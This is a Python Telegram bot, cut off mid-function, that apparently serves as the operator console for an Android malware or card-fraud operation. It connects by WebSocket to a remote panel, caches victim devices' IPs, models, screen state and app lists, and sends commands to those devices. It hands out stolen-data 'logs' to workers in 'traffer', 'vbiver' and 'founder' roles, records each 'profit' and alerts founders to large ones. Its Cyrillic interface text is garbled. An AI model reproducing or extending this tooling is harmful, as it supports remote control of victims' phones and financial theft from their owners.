import os
import re
import asyncio
import json
import logging
import contextlib
from pathlib import Path
from datetime import datetime, timedelta, timezone
from collections import defaultdict, Counter

from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery, BotCommand,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
import websockets

# ---------- CONFIG ----------
load_dotenv(dotenv_path=Path(__file__).with_name(".env"))

# Telegram
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()}
ALLOWED_CHAT_IDS = {int(x) for x in os.getenv("ALLOWED_CHAT_IDS", "").split(",") if x.strip().lstrip("-").isdigit()}

# Roles
FOUNDER_IDS = {int(x) for x in os.getenv("FOUNDER_IDS", "").split(",") if x.strip().isdigit()}
VBIVER_IDS  = {int(x) for x in os.getenv("VBIVER_IDS", "").split(",")  if x.strip().isdigit()}
TRAFFER_IDS = {int(x) for x in os.getenv("TRAFFER_IDS", "").split(",") if x.strip().isdigit()}

ROLE_TRAFFER = 1
ROLE_VBIVER  = 2
ROLE_FOUNDER = 3

# WebSocket
WS_URL = os.getenv("WS_URL", "")
AUTH_TYPE = (os.getenv("WS_AUTH_TYPE", "cookie") or "cookie").lower()  # cookie|bearer|protocol|none
WS_TOKEN = os.getenv("WS_TOKEN", "")
WS_COOKIE = os.getenv("WS_COOKIE", "")
WS_ORIGIN = os.getenv("WS_ORIGIN", "https://zam.claydc.top")

WS_INIT_AUTH_JSON = os.getenv("WS_INIT_AUTH_JSON", "")
WS_AUTH_OK_EVENT = (os.getenv("WS_AUTH_OK_EVENT", "welcome") or "welcome").strip().lower()

WS_USER_AGENT = os.getenv("WS_USER_AGENT", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36")
WS_ACCEPT_LANGUAGE = os.getenv("WS_ACCEPT_LANGUAGE", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
WS_CACHE_CONTROL = os.getenv("WS_CACHE_CONTROL", "no-cache")
WS_PRAGMA = os.getenv("WS_PRAGMA", "no-cache")

# Business settings
BIG_PROFIT = int(os.getenv("BIG_PROFIT", "5000"))

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("clonnex")


def allowed_chat(chat_id: int) -> bool:
    return (not ALLOWED_CHAT_IDS) or (chat_id in ALLOWED_CHAT_IDS)


def is_admin(uid: int, chat_id: int) -> bool:
    return ((not ADMIN_IDS) or (uid in ADMIN_IDS)) and allowed_chat(chat_id)


def role_level(uid: int) -> int:
    if uid in FOUNDER_IDS:
        return ROLE_FOUNDER
    if uid in VBIVER_IDS:
        return ROLE_VBIVER
    if uid in TRAFFER_IDS:
        return ROLE_TRAFFER
    return 0


# ---------- RUNTIME STATE ----------
DEVICES: dict[str, dict] = {}     # devices cache
BLACKLIST_UUIDS: set[str] = set()

# –õ–æ–≥–∏ (–º–∏–Ω–∏–º–∞–ª—å–Ω–∞—è in-memory —Å—Ö–µ–º–∞)
# uuid -> dict(
#   uuid, raw, quarantined, assigned_to, assigned_at, worker, operator,
#   trafer_id, meta{... source/ref/ip/model/android ...}, ts,
#   profit (float), profit_note (str), profited_at (iso)
# )
LOGS: dict[str, dict] = {}

# –æ–∂–∏–¥–∞–Ω–∏—è –≤–≤–æ–¥–∞ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
PENDING_PROFIT: dict[int, str] = {}     # user_id -> uuid
# –±–∏–ª–¥–µ—Ä: {uid: {"mode": "name"/"text", "buffer": {"name":...}}}
BUILDER_STATE: dict[int, dict] = {}
# –ª–∏—á–Ω—ã–µ —à–∞–±–ª–æ–Ω—ã: uid -> [{name, text, created_at}]
TEMPLATES: defaultdict[int, list] = defaultdict(list)

# regex –Ω–∞ permission denied
RE_DENIED = re.compile(r"\bpermission\s+denied\b", re.I)


# ---------- UI HELPERS ----------
def kb_main(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‚öôÔ∏è –í–æ—Ä–∫-–ø–∞–Ω–µ–ª—å", callback_data="menu:work")]
    ])


def kb_work(uid: int) -> InlineKeyboardMarkup:
    lvl = role_level(uid)
    rows = []
    if lvl >= ROLE_TRAFFER:
        rows.append([InlineKeyboardButton(text="üì¨ –¢—Ä–∞—Ñ—Ñ-–ø–∞–Ω–µ–ª—å", callback_data="work:tr")])
    if lvl >= ROLE_VBIVER:
        rows.append([InlineKeyboardButton(text="üß≤ –í–±–∏–≤-–ø–∞–Ω–µ–ª—å", callback_data="work:vb")])
    if lvl >= ROLE_FOUNDER:
        rows.append([InlineKeyboardButton(text="üõ† –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å", callback_data="work:admin")])
    rows.append([InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="menu:root")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_admin(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üü° –ó–∞—è–≤–∫–∏", callback_data="admin:requests")],
        [InlineKeyboardButton(text="üë∑ –í–±–∏–≤–µ—Ä—ã", callback_data="admin:vbivers")],
        [InlineKeyboardButton(text="üìä –û—Ç—á—ë—Ç—ã", callback_data="admin:reports")],
        [InlineKeyboardButton(text="üß∞ –®–∞–±–ª–æ–Ω—ã –ø—Ä–∏—á–∏–Ω", callback_data="admin:reasons")],
        [InlineKeyboardButton(text="‚õî Blacklist UUID", callback_data="admin:blacklist")],
        [InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="menu:work")]
    ])


def kb_vb(uid: int, has_active: bool) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton(text="üß≤ –ü–æ–ª—É—á–∏—Ç—å –ª–æ–≥", callback_data="vb:get")],
        [InlineKeyboardButton(text="üì¶ –ú–æ–π –ª–æ–≥", callback_data="vb:my")],
    ]
    if has_active:
        rows.append([
            InlineKeyboardButton(text="üí¨ –°–ú–°", callback_data="vb:sms"),
            InlineKeyboardButton(text="üí∞ –ü—Ä–æ—Ñ–∏—Ç", callback_data="vb:profit"),
            InlineKeyboardButton(text="üîì –û—Å–≤–æ–±–æ–¥–∏—Ç—å", callback_data="vb:free"),
        ])
    rows.append([InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="menu:work")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def kb_tr(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‚úâÔ∏è –ú–æ–∏ –≤—Ö–æ–¥—è—â–∏–µ", callback_data="tr:inbox")],
        [InlineKeyboardButton(text="üö´ –û—à–∏–±–∫–∏ –¥–æ—Å—Ç—É–ø–∞", callback_data="tr:denied")],
        [InlineKeyboardButton(text="üìà –ú–æ–∏ –∏—Å—Ç–æ—á–Ω–∏–∫–∏", callback_data="tr:sources")],
        [InlineKeyboardButton(text="üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="tr:stats")],
        [InlineKeyboardButton(text="üß± –ë–∏–ª–¥–µ—Ä", callback_data="tr:builder")],
        [InlineKeyboardButton(text="üìö –ì–∞–π–¥/FAQ", callback_data="tr:faq")],
        [InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="menu:work")],
    ])


def kb_tr_stats(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="24h", callback_data="tr:stats:24h"),
            InlineKeyboardButton(text="7d",  callback_data="tr:stats:7d"),
            InlineKeyboardButton(text="30d", callback_data="tr:stats:30d"),
            InlineKeyboardButton(text="All", callback_data="tr:stats:all"),
        ],
        [InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="work:tr")],
    ])


def kb_builder(uid: int) -> InlineKeyboardMarkup:
    kb = []
    # —Å–ø–∏—Å–æ–∫ —à–∞–±–ª–æ–Ω–æ–≤
    if TEMPLATES[uid]:
        for i, t in enumerate(TEMPLATES[uid][:10], 1):
            kb.append([InlineKeyboardButton(text=f"üìÑ {t['name']}", callback_data=f"builder:view:{i-1}")])
    kb.append([InlineKeyboardButton(text="‚ûï –°–æ–∑–¥–∞—Ç—å —à–∞–±–ª–æ–Ω", callback_data="builder:new")])
    kb.append([InlineKeyboardButton(text="‚¨ÖÔ∏è –ù–∞–∑–∞–¥", callback_data="work:tr")])
    return InlineKeyboardMarkup(inline_keyboard=kb)


async def setup_bot_commands(bot: Bot) -> None:
    await bot.set_my_commands([
        BotCommand(command="start", description="–ó–∞–ø—É—Å–∫"),
        BotCommand(command="menu",  description="–í–æ—Ä–∫-–ø–∞–Ω–µ–ª—å"),
        BotCommand(command="ping",  description="–ü—Ä–æ–≤–µ—Ä–∫–∞"),
        BotCommand(command="devices", description="–°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤"),
        BotCommand(command="device",  description="–ö–∞—Ä—Ç–æ—á–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞"),
        BotCommand(command="apps",    description="–°–ø–∏—Å–æ–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π"),
        BotCommand(command="whoami",  description="–ú–æ–π user_id"),
        BotCommand(command="whereami",description="ID —á–∞—Ç–∞"),
        BotCommand(command="profit",  description="–ü—Ä–æ—Ñ–∏—Ç –ø–æ UUID"),
    ])


# ---------- WS CLIENT ----------
class WSClient:
    def __init__(self, bot: Bot) -> None:
        self.ws: websockets.WebSocketClientProtocol | None = None
        self.auth_ok: bool = False
        self.bot = bot

    def _conn_args(self) -> dict:
        k: dict = {}
        headers: dict[str, str] = {}
        if AUTH_TYPE == "bearer" and WS_TOKEN:
            headers["Authorization"] = f"Bearer {WS_TOKEN}"
        elif AUTH_TYPE == "cookie" and WS_COOKIE:
            headers["Cookie"] = WS_COOKIE
        if WS_ORIGIN:          headers["Origin"] = WS_ORIGIN
        if WS_USER_AGENT:      headers["User-Agent"] = WS_USER_AGENT
        if WS_ACCEPT_LANGUAGE: headers["Accept-Language"] = WS_ACCEPT_LANGUAGE
        if WS_CACHE_CONTROL:   headers["Cache-Control"] = WS_CACHE_CONTROL
        if WS_PRAGMA:          headers["Pragma"] = WS_PRAGMA
        if headers:
            k["extra_headers"] = headers
        if AUTH_TYPE == "protocol" and WS_TOKEN:
            toks = [t.strip() for t in WS_TOKEN.split(",") if t.strip()]
            k["subprotocols"] = toks or [WS_TOKEN]
        return k

    async def run(self) -> None:
        if not WS_URL:
            log.error("WS_URL –ø—É—Å—Ç")
            await asyncio.Future()

        backoff = 1
        while True:
            try:
                log.info("WS connecting ‚Üí %s", WS_URL)
                async with websockets.connect(
                    WS_URL, ping_interval=20, ping_timeout=20, **self._conn_args()
                ) as ws:
                    self.ws = ws
                    self.auth_ok = False
                    log.info("WS connected; protocol=%s", ws.subprotocol or "-")

                    if WS_INIT_AUTH_JSON:
                        await ws.send(WS_INIT_AUTH_JSON)
                        log.info("WS sent init auth json")

                    asyncio.create_task(self._auth_watchdog())

                    async for raw in ws:
                        try:
                            data = json.loads(raw)
                        except Exception:
                            data = {"type": "raw", "payload": raw}

                        t = (data.get("type") or "").lower()
                        evt = (data.get("event") or "").lower()

                        if not self.auth_ok:
                            ok_by_env = (WS_AUTH_OK_EVENT and (t == WS_AUTH_OK_EVENT or evt == WS_AUTH_OK_EVENT))
                            ok_by_event = evt in {"welcome", "clients_update", "client_update", "log_upsert"}
                            ok_by_type = t in {"device_status", "device_info", "apps_list", "log", "sms_incoming", "sms_result"}
                            if ok_by_env or ok_by_event or ok_by_type:
                                self.auth_ok = True
                                log.info("AUTH OK ‚úÖ")

                        await self._handle(data)

            except websockets.InvalidStatusCode as e:
                hdrs = getattr(e, "headers", None)
                log.warning("WS InvalidStatusCode: %s; headers=%s; reconnect in %ss", e.status_code, hdrs, backoff)
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 30)
            except Exception as e:
                log.warning("WS error: %r; reconnect in %ss", e, backoff)
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 30)

    async def _auth_watchdog(self) -> None:
        await asyncio.sleep(5)
        if not self.auth_ok:
            log.error("AUTH not confirmed in 5s ‚Äî –ø—Ä–æ–≤–µ—Ä—å .env")

    async def _handle(self, data: dict) -> None:
        t = (data.get("type") or "").lower()
        evt = (data.get("event") or "").lower()

        if evt == "clients_update" and isinstance(data.get("clients"), list):
            for c in data["clients"]:
                dev_id = c.get("ID") or c.get("UUID") or c.get("id") or c.get("uuid")
                if not dev_id:
                    continue
                DEVICES.setdefault(dev_id, {}).update({
                    "name":            c.get("DeviceName"),
                    "model":           c.get("DeviceModel"),
                    "android":         c.get("AndroidVersion"),
                    "battery":         c.get("BatteryLevel"),
                    "ip":              c.get("IP") or c.get("IPAddress"),
                    "status":          "online" if c.get("IsConnected") else "offline",
                    "screen":          "on" if c.get("IsScreenOn") else "off",
                    "worker":          c.get("worker_name"),
                    "client":          c.get("ClientType"),
                    "connection":      c.get("ConnectionMethod") or c.get("ConnectionType"),
                    "last_seen":       c.get("FormattedLastSeen") or c.get("LastSeen"),
                    "connected_for":   c.get("FormatTimeConnected"),
                    "webview_url":     c.get("webview_url"),
                    "tag":             c.get("Tag"),
                })
            log.info("[cache] devices updated: %d", len(DEVICES))
            return

        if evt == "log_upsert" or t == "log_upsert":
            uuid = data.get("uuid") or data.get("UUID")
            if not uuid:
                log.info("[WS recv] log_upsert without uuid: %s", data)
                return

            raw = data.get("raw") or ""
            raw_norm = " ".join(str(raw).lower().replace("‚Ä¢", "").split())
            denied = bool(RE_DENIED.search(raw_norm))

            meta = data.get("meta") or {}
            worker = data.get("worker") or meta.get("worker")
            operator = data.get("operator") or meta.get("operator")
            trafer_uid = data.get("traffer_user_id") or meta.get("traffer_user_id")
            ts = data.get("ts") or datetime.now(timezone.utc).isoformat()

            LOGS[uuid] = {
                "uuid": uuid,
                "raw": raw,
                "quarantined": denied,
                "assigned_to": None,
                "assigned_at": None,
                "worker": worker,
                "operator": operator,
                "trafer_id": trafer_uid,
                "meta": meta,
                "ts": ts,
                "profit": 0.0,
                "profit_note": "",
                "profited_at": None,
            }

            if denied:
                text = (
                    f"üö´ <b>–õ–æ–≥ —Å –æ—à–∏–±–∫–æ–π –¥–æ—Å—Ç—É–ø–∞</b>\n"
                    f"UUID: <code>{uuid}</code>\n"
                    f"–û–±–Ω–∞—Ä—É–∂–µ–Ω–æ: <code>permission denied</code>\n\n"
                    f"–ü—Ä–æ–≤–µ—Ä—å –∏—Å—Ç–æ—á–Ω–∏–∫/–∞–∫–∫–∞—É–Ω—Ç –∏ –ø—Ä–∞–≤–∞. "
                    f"–ü–æ—Å–ª–µ —Ñ–∏–∫—Å–∞ –æ—Ç–∫—Ä–æ–π –¢—Ä–∞—Ñ—Ñ-–ø–∞–Ω–µ–ª—å ‚Üí ¬´–û—à–∏–±–∫–∏ –¥–æ—Å—Ç—É–ø–∞¬ª –∏ –æ—Ç–º–µ—Ç—å –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–º."
                )
                if trafer_uid:
                    try:
                        await self.bot.send_message(trafer_uid, text, parse_mode="HTML")
                    except Exception as e:
                        log.warning("notify trafer failed: %r", e)
            return

        log.info("[WS recv] %s", data)

    async def send(self, obj: dict) -> None:
        if not self.ws:
            log.warning("WS not connected; drop send: %s", obj)
            return
        await self.ws.send(json.dumps(obj))
        log.info("[WS send] %s", obj)


# ---------- HELPERS (stats/format) ----------
def _parse_iso(ts: str | None) -> datetime | None:
    if not ts:
        return None
    try:
        return datetime.fromisoformat(ts.replace("Z", "+00:00"))
    except Exception:
        return None

def logs_for_trafer(uid: int, since: datetime | None = None):
    for v in LOGS.values():
        if v.get("trafer_id") != uid:
            continue
        t = _parse_iso(v.get("ts"))
        if since and t and t < since:
            continue
        yield v

def compute_stats(uid: int, period: str = "24h") -> dict:
    now = datetime.now(timezone.utc)
    if period == "24h":
        since = now - timedelta(hours=24)
    elif period == "7d":
        since = now - timedelta(days=7)
    elif period == "30d":
        since = now - timedelta(days=30)
    else:
        since = None

    items = list(logs_for_trafer(uid, since))
    total = len(items)
    denied = sum(1 for v in items if v.get("quarantined"))
    live = total - denied
    assigned = sum(1 for v in items if v.get("assigned_to"))
    profited = [v for v in items if (v.get("profit") or 0) > 0]
    profit_count = len(profited)
    profit_sum = sum(float(v.get("profit") or 0) for v in profited)
    profit_avg = (profit_sum / profit_count) if profit_count else 0.0

    # —Å—Ä–µ–¥–Ω–∏–µ –∑–∞–¥–µ—Ä–∂–∫–∏
    assign_deltas, profit_deltas = [], []
    for v in items:
        t0 = _parse_iso(v.get("ts"))
        ta = _parse_iso(v.get("assigned_at"))
        tp = _parse_iso(v.get("profited_at"))
        if t0 and ta:
            assign_deltas.append((ta - t0).total_seconds())
        if t0 and tp:
            profit_deltas.append((tp - t0).total_seconds())

    def _fmt_sec(x):
        if not x:
            return "-"
        m, s = divmod(int(x), 60); h, m = divmod(m, 60)
        return f"{h}—á {m}–º"

    assign_avg = _fmt_sec(sum(assign_deltas)/len(assign_deltas) if assign_deltas else 0)
    profit_avg_time = _fmt_sec(sum(profit_deltas)/len(profit_deltas) if profit_deltas else 0)

    # –∏—Å—Ç–æ—á–Ω–∏–∫–∏
    top_src = Counter((v.get("meta") or {}).get("source") or (v.get("meta") or {}).get("ref") or "‚Äî" for v in items)
    top_lines = [f"‚Ä¢ {name}: {cnt}" for name, cnt in top_src.most_common(5)]

    live_rate = (live / total * 100) if total else 0.0
    conv_to_profit = (profit_count / total * 100) if total else 0.0

    return {
        "period": period,
        "total": total,
        "denied": denied,
        "live": live,
        "assigned": assigned,
        "profit_count": profit_count,
        "profit_sum": profit_sum,
        "profit_avg": profit_avg,
        "live_rate": live_rate,
        "conv_to_profit": conv_to_profit,
        "assign_avg": assign_avg,
        "profit_avg_time": profit_avg_time,
        "top_src_lines": top_lines,
    }


def render_stats(s: dict) -> str:
    return (
        f"üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ ({s['period']})</b>\n"
        f"–í—Å–µ–≥–æ –ª–æ–≥–æ–≤: <b>{s['total']}</b>\n"
        f"Denied: <b>{s['denied']}</b> ‚Ä¢ Live: <b>{s['live']}</b> (<i>{s['live_rate']:.0f}%</i>)\n"
        f"–ù–∞–∑–Ω–∞—á–µ–Ω–æ: <b>{s['assigned']}</b>\n"
        f"–ü—Ä–æ—Ñ–∏—Ç—ã: <b>{s['profit_count']}</b> / <b>{s['profit_sum']:.0f}</b> (avg {s['profit_avg']:.0f})\n"
        f"–°—Ä–µ–¥–Ω. –¥–æ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏—è: <b>{s['assign_avg']}</b>\n"
        f"–°—Ä–µ–¥–Ω. –¥–æ –ø—Ä–æ—Ñ–∏—Ç–∞: <b>{s['profit_avg_time']}</b>\n\n"
        f"<b>–¢–æ–ø –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤</b>:\n" + ("\n".join(s['top_src_lines']) or "‚Äî")
    )


# ---------- TELEGRAM ----------
router = Router()

def ensure_access(m: Message | CallbackQuery) -> bool:
    if isinstance(m, Message):
        return allowed_chat(m.chat.id)
    return allowed_chat(m.message.chat.id)

@router.message(Command("whoami"))
async def whoami(m: Message):
    await m.answer(f"user_id: {m.from_user.id}\nchat_id: {m.chat.id}")

@router.message(Command("whereami"))
async def whereami(m: Message):
    await m.answer(f"chat_id: {m.chat.id}")

@router.message(Command("start"))
async def start(m: Message):
    if not ensure_access(m):
        return
    await m.answer("—è –∂–∏–≤. /ping /devices /device <id> /apps <id> ‚Äî —Å–º–æ—Ç—Ä–∏ WS –≤ –∫–æ–Ω—Å–æ–ª–∏",
                   reply_markup=kb_main(m.from_user.id))

@router.message(Command("menu"))
async def menu_cmd(m: Message):
    if not ensure_access(m):
        return
    await m.answer("‚öôÔ∏è –í–æ—Ä–∫-–ø–∞–Ω–µ–ª—å", reply_markup=kb_work(m.from_user.id))

@router.message(Command("ping"))
async def ping(m: Message):
    if not ensure_access(m):
        return
    await m.answer("pong")

@router.message(Command("devices"))
async def devices(m: Message):
    if not ensure_access(m):
        return
    if not DEVICES:
        await m.answer("–ø–æ–∫–∞ –Ω–µ—Ç –¥–∞–Ω–Ω—ã—Ö. –∫–∞–∫ —Ç–æ–ª—å–∫–æ WS –ø—Ä–∏—à–ª—ë—Ç —Å—Ç–∞—Ç—É—Å—ã, –æ–Ω–∏ –ø–æ—è–≤—è—Ç—Å—è.")
        return
    lines = []
    for d, v in list(DEVICES.items())[:60]:
        name = v.get("name") or v.get("model") or "?"
        status = v.get("status", "?")
        worker = v.get("worker") or ""
        lines.append(f"‚Ä¢ <code>{d}</code> ‚Äî {name} ‚Äî {status}" + (f" ‚Äî {worker}" if worker else ""))
    if len(DEVICES) > 60:
        lines.append(f"‚Ä¶–∏ –µ—â—ë {len(DEVICES)-60}")
    await m.answer("\n".join(lines), parse_mode="HTML")

@router.message(Command("device"))
async def device(m: Message, ws: WSClient):
    if not ensure_access(m):
        return
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2:
        await m.answer("–∏—Å–ø–æ–ª—å–∑—É–π: /device <id>")
        return
    dev = parts[1].strip()
    v = DEVICES.get(dev, {})
    text = (
        f"<b>{v.get('name') or v.get('model', '?')}</b>\n"
        f"Android: {v.get('android', '?')}  ‚Ä¢  –°—Ç–∞—Ç—É—Å: {v.get('status', '?')}  ‚Ä¢  –≠–∫—Ä–∞–Ω: {v.get('screen', '?')}\n"
        f"IP: {v.get('ip', '?')}  ‚Ä¢  –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ: {v.get('connection', '?')}\n"
        f"–†–∞–±–æ—Ç–Ω–∏–∫: {v.get('worker', '-')}\n"
        f"–ü–æ—Å–ª–µ–¥. –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: {v.get('last_seen', '-')}\n"
        f"–û–Ω–ª–∞–π–Ω: {v.get('connected_for', '-')}\n"
    )
    await m.answer(text, parse_mode="HTML")
    await ws.send({"type": "cmd", "action": "device_info_get", "device_id": dev})

@router.message(Command("apps"))
async def apps(m: Message, ws: WSClient):
    if not ensure_access(m):
        return
    parts = m.text.split()
    if len(parts) < 2:
        await m.answer("–∏—Å–ø–æ–ª—å–∑—É–π: /apps <device_id>")
        return
    dev = parts[1]
    await m.answer("–∑–∞–ø—Ä–æ—Å–∏–ª —Å–ø–∏—Å–æ–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π; —Å–º–æ—Ç—Ä–∏ –ª–æ–≥–∏ –∫–æ–Ω—Å–æ–ª–∏.")
    await ws.send({"type": "cmd", "action": "apps_list_get", "device_id": dev})

# –ü—Ä–æ—Ñ–∏—Ç: /profit <uuid> <amount> [note...]
@router.message(Command("profit"))
async def cmd_profit(m: Message):
    if role_level(m.from_user.id) < ROLE_VBIVER or not ensure_access(m):
        return
    parts = m.text.split(maxsplit=2)
    if len(parts) < 3:
        await m.answer("–∏—Å–ø–æ–ª—å–∑—É–π: /profit <uuid> <amount> [note]")
        return
    uuid, amount = parts[1], parts[2].split()[0]
    try:
        amount_val = float(amount.replace(",", "."))
    except Exception:
        await m.answer("—Å—É–º–º–∞ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞")
        return
    if uuid not in LOGS or LOGS[uuid].get("assigned_to") != m.from_user.id:
        await m.answer("—ç—Ç–æ—Ç uuid –Ω–µ –≤ —Ç–≤–æ–∏—Ö –∞–∫—Ç–∏–≤–Ω—ã—Ö –ª–æ–≥–∞—Ö")
        return
    note = parts[2][len(amount):].strip() if len(parts) >= 3 else ""
    LOGS[uuid]["profit"] = amount_val
    LOGS[uuid]["profit_note"] = note
    LOGS[uuid]["profited_at"] = datetime.now(timezone.utc).isoformat()
    await m.answer(f"‚úÖ –ø—Ä–æ—Ñ–∏—Ç {amount_val:.0f} —Å–æ—Ö—Ä–∞–Ω—ë–Ω –¥–ª—è {uuid}")

    if amount_val >= BIG_PROFIT:
        for fid in FOUNDER_IDS:
            with contextlib.suppress(Exception):
                await m.bot.send_message(fid, f"üí• –ö—Ä—É–ø–Ω—ã–π –ø—Ä–æ—Ñ–∏—Ç: <b>{amount_val:.0f}</b>\nUUID: <code>{uuid}</code>",
                                         parse_mode="HTML")

# ---------- INLINE NAVIGATION ----------
router_cb = router.callback_query

@router_cb(F.data == "menu:root")
async def cb_root(c: CallbackQuery):
    await c.message.edit_text("–≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", reply_markup=kb_main(c.from_user.id))
    await c.answer()

@router_cb(F.data == "menu:work")
async def cb_work(c: CallbackQuery):
    if role_level(c.from_user.id) == 0:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True)
        return
    await c.message.edit_text("‚öôÔ∏è –í–æ—Ä–∫-–ø–∞–Ω–µ–ª—å", reply_markup=kb_work(c.from_user.id))
    await c.answer()

# --- Admin panel (founder only)
@router_cb(F.data == "work:admin")
async def cb_admin(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_FOUNDER:
        await c.answer("—Ç–æ–ª—å–∫–æ –¥–ª—è founder", show_alert=True)
        return
    await c.message.edit_text("üõ† –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å", reply_markup=kb_admin(c.from_user.id))
    await c.answer()

# --- VB panel
@router_cb(F.data == "work:vb")
async def cb_vb(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True)
        return
    has_active = any(v.get("assigned_to") == c.from_user.id for v in LOGS.values())
    await c.message.edit_text("üß≤ –í–±–∏–≤-–ø–∞–Ω–µ–ª—å", reply_markup=kb_vb(c.from_user.id, has_active))
    await c.answer()

@router_cb(F.data == "vb:get")
async def cb_vb_get(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True); return
    if any(v.get("assigned_to") == c.from_user.id for v in LOGS.values()):
        await c.answer("—É —Ç–µ–±—è —É–∂–µ –µ—Å—Ç—å –∞–∫—Ç–∏–≤–Ω—ã–π –ª–æ–≥", show_alert=True); return
    for uuid, v in LOGS.items():
        if v.get("assigned_to") is None and not v.get("quarantined") and uuid not in BLACKLIST_UUIDS:
            v["assigned_to"] = c.from_user.id
            v["assigned_at"] = datetime.now(timezone.utc).isoformat()
            await c.message.edit_text(
                f"üì¶ <b>–í—ã–¥–∞–Ω –ª–æ–≥</b>\nUUID: <code>{uuid}</code>\n"
                f"–í–æ—Ä–∫–µ—Ä: {v.get('worker') or '-'} ‚Ä¢ –û–ø–µ—Ä–∞—Ç–æ—Ä: {v.get('operator') or '-'}",
                parse_mode="HTML",
                reply_markup=kb_vb(c.from_user.id, has_active=True),
            )
            await c.answer("–ª–æ–≥ –≤—ã–¥–∞–Ω"); return
    await c.answer("—Å–≤–æ–±–æ–¥–Ω—ã—Ö –ª–æ–≥–æ–≤ –Ω–µ—Ç", show_alert=True)

@router_cb(F.data == "vb:my")
async def cb_vb_my(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True); return
    for uuid, v in LOGS.items():
        if v.get("assigned_to") == c.from_user.id:
            text = (
                f"üì¶ <b>–ú–æ–π –ª–æ–≥</b>\nUUID: <code>{uuid}</code>\n"
                f"–í–æ—Ä–∫–µ—Ä: {v.get('worker') or '-'} ‚Ä¢ –û–ø–µ—Ä–∞—Ç–æ—Ä: {v.get('operator') or '-'}\n"
                f"–í—ã–¥–∞–Ω: {v.get('assigned_at') or '-'}"
            )
            await c.message.edit_text(text, parse_mode="HTML", reply_markup=kb_vb(c.from_user.id, has_active=True))
            await c.answer(); return
    await c.answer("–∞–∫—Ç–∏–≤–Ω–æ–≥–æ –ª–æ–≥–∞ –Ω–µ—Ç", show_alert=True)

@router_cb(F.data == "vb:free")
async def cb_vb_free(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True); return
    for uuid, v in LOGS.items():
        if v.get("assigned_to") == c.from_user.id:
            v["assigned_to"] = None
            v["assigned_at"] = None
            await c.message.edit_text("–ª–æ–≥ –æ—Å–≤–æ–±–æ–∂–¥—ë–Ω", reply_markup=kb_vb(c.from_user.id, has_active=False))
            await c.answer("–æ—Å–≤–æ–±–æ–∂–¥–µ–Ω"); return
    await c.answer("–∞–∫—Ç–∏–≤–Ω–æ–≥–æ –ª–æ–≥–∞ –Ω–µ—Ç", show_alert=True)

@router_cb(F.data == "vb:sms")
async def cb_vb_sms(c: CallbackQuery):
    await c.answer("–°–ú–°-–ø–∞–Ω–µ–ª—å –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ", show_alert=True)

@router_cb(F.data == "vb:profit")
async def cb_vb_profit(c: CallbackQuery):
    if role_level(c.from_user.id) < ROLE_VBIVER:
        await c.answer("–Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞", show_alert=True); return
    for uuid, v in LOGS.items():
        if v.get("assigned_to") == c.from_user.id:
